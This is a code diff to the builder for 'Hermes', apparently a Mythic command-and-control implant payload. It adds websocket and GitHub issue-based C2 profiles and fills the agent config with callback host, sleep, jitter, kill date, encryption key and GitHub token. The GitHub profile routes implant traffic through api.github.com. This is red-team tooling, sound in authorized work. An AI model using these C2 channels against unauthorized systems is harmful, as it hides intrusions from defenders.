@@ -39,7 +39,7 @@ class Hermes(PayloadType):
     agent_path = pathlib.Path(".") / "hermes"
     agent_icon_path = agent_path / "agent_functions" / "hermes.svg"
     agent_code_path = agent_path / "agent_code"
-    c2_profiles = ["http"]
+    c2_profiles = ["http", "websocket", "github"]
     support_browser_scripts = [
         BrowserScript(script_name="create_table", author="@its_a_feature_")
     ]
@@ -60,13 +60,17 @@ class Hermes(PayloadType):
         agent_config_path = "/Mythic/hermes/agent_code/Hermes/config.swift"
         shutil.copyfile(agent_config_bak_path, agent_config_path)
 
+        # Get the C2 profile type
+        profile = self.c2info[0].get_c2profile()["name"]
+        params = self.c2info[0].get_parameters_dict()
+
         # pull user agent, host header, and custom headers from c2info
         user_agent = ""
         host_header = ""
         http_headers = ""
 
         # parse user agent, host header, and custom headers
-        for key, val in self.c2info[0].get_parameters_dict().items():
+        for key, val in params.items():
             if key == "headers":
                 for item in val:
                     if item == "User-Agent":
@@ -85,26 +89,78 @@ class Hermes(PayloadType):
 
         # check if callback host is using SSL
         use_ssl = "false"
-        if "https" in self.c2info[0].get_parameters_dict()["callback_host"]:
+        callback_host = params.get("callback_host", "")
+        if "https" in callback_host or "wss" in callback_host:
             use_ssl = "true"
 
-        # open config file and update variables
+        # Common replacements for all profiles
         replacements = {
             "REPLACE_PAYLOAD_UUID": self.uuid,
-            "REPLACE_ENCODED_AES_KEY": self.c2info[0].get_parameters_dict()["AESPSK"]["enc_key"],
-            "REPLACE_CALLBACK_HOST": (self.c2info[0].get_parameters_dict()["callback_host"]).replace("https://","").replace("http://",""),
-            "REPLACE_GET_REQUEST_URI": "/" + self.c2info[0].get_parameters_dict()["get_uri"],
-            "REPLACE_POST_REQUEST_URI": "/" + self.c2info[0].get_parameters_dict()["post_uri"],
-            "REPLACE_CALLBACK_PORT": self.c2info[0].get_parameters_dict()["callback_port"],
-            "REPLACE_QUERY_PARAMETER": self.c2info[0].get_parameters_dict()["query_path_name"],
-            "REPLACE_SLEEP": self.c2info[0].get_parameters_dict()["callback_interval"],
-            "REPLACE_JITTER": self.c2info[0].get_parameters_dict()["callback_jitter"],
-            "REPLACE_KILL_DATE": self.c2info[0].get_parameters_dict()["killdate"],
+            "REPLACE_ENCODED_AES_KEY": params["AESPSK"]["enc_key"],
+            "REPLACE_C2_PROFILE_TYPE": profile,
+            "REPLACE_CALLBACK_HOST": callback_host.replace("https://","").replace("http://","").replace("wss://","").replace("ws://",""),
+            "REPLACE_CALLBACK_PORT": params.get("callback_port", 443),
             "REPLACE_USER_AGENT": user_agent,
             "REPLACE_HOST_HEADER": host_header,
             "REPLACE_USE_SSL": use_ssl,
-            "REPLACE_HTTP_HEADERS": http_headers
+            "REPLACE_HTTP_HEADERS": http_headers,
+            "REPLACE_SLEEP": params.get("callback_interval", 10),
+            "REPLACE_JITTER": params.get("callback_jitter", 23),
+            "REPLACE_KILL_DATE": params.get("killdate", "2099-01-01"),
         }
+
+        # HTTP profile specific replacements
+        if profile == "http":
+            replacements["REPLACE_GET_REQUEST_URI"] = "/" + params.get("get_uri", "index")
+            replacements["REPLACE_POST_REQUEST_URI"] = "/" + params.get("post_uri", "data")
+            replacements["REPLACE_QUERY_PARAMETER"] = params.get("query_path_name", "q")
+            replacements["REPLACE_WEBSOCKET_ENDPOINT"] = "/socket"
+            replacements["REPLACE_GITHUB_REPO"] = ""
+            replacements["REPLACE_GITHUB_USERNAME"] = ""
+            replacements["REPLACE_GITHUB_TOKEN"] = ""
+            replacements["REPLACE_GITHUB_SERVER_ISSUE"] = 1
+            replacements["REPLACE_GITHUB_CLIENT_ISSUE"] = 2
+        # WebSocket profile specific replacements
+        elif profile == "websocket":
+            replacements["REPLACE_WEBSOCKET_ENDPOINT"] = "/" + params.get("ENDPOINT_REPLACE", "socket")
+            replacements["REPLACE_GET_REQUEST_URI"] = "/index"
+            replacements["REPLACE_POST_REQUEST_URI"] = "/data"
+            replacements["REPLACE_QUERY_PARAMETER"] = "q"
+            replacements["REPLACE_GITHUB_REPO"] = ""
+            replacements["REPLACE_GITHUB_USERNAME"] = ""
+            replacements["REPLACE_GITHUB_TOKEN"] = ""
+            replacements["REPLACE_GITHUB_SERVER_ISSUE"] = 1
+            replacements["REPLACE_GITHUB_CLIENT_ISSUE"] = 2
+        # GitHub profile specific replacements
+        elif profile == "github":
+            replacements["REPLACE_GITHUB_REPO"] = params.get("github_repo", "")
+            replacements["REPLACE_GITHUB_USERNAME"] = params.get("github_username", "")
+            replacements["REPLACE_GITHUB_TOKEN"] = params.get("personal_access_token", "")
+            replacements["REPLACE_GITHUB_SERVER_ISSUE"] = int(params.get("server_issue_number", 1))
+            replacements["REPLACE_GITHUB_CLIENT_ISSUE"] = int(params.get("client_issue_number", 2))
+            # Set defaults for unused profile parameters
+            replacements["REPLACE_GET_REQUEST_URI"] = "/index"
+            replacements["REPLACE_POST_REQUEST_URI"] = "/data"
+            replacements["REPLACE_QUERY_PARAMETER"] = "q"
+            replacements["REPLACE_WEBSOCKET_ENDPOINT"] = "/socket"
+            # GitHub doesn't use callback_host in the same way, use api.github.com
+            replacements["REPLACE_CALLBACK_HOST"] = "api.github.com"
+            replacements["REPLACE_CALLBACK_PORT"] = 443
+            replacements["REPLACE_USE_SSL"] = "true"
+            # Get user_agent from github profile params
+            if params.get("user_agent"):
+                replacements["REPLACE_USER_AGENT"] = params.get("user_agent")
+        else:
+            # Default values for unknown profiles
+            replacements["REPLACE_GET_REQUEST_URI"] = "/index"
+            replacements["REPLACE_POST_REQUEST_URI"] = "/data"
+            replacements["REPLACE_QUERY_PARAMETER"] = "q"
+            replacements["REPLACE_WEBSOCKET_ENDPOINT"] = "/socket"
+            replacements["REPLACE_GITHUB_REPO"] = ""
+            replacements["REPLACE_GITHUB_USERNAME"] = ""
+            replacements["REPLACE_GITHUB_TOKEN"] = ""
+            replacements["REPLACE_GITHUB_SERVER_ISSUE"] = 1
+            replacements["REPLACE_GITHUB_CLIENT_ISSUE"] = 2
         
         config_file = open(agent_config_path, "rt")
         data = config_file.read()
@@ -123,7 +179,7 @@ class Hermes(PayloadType):
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Configure Hermes",
-            StepStdout="Hermes configuration populated successfully",
+            StepStdout=f"Hermes configuration populated successfully for {profile} profile",
             StepSuccess=True
         )) 
 
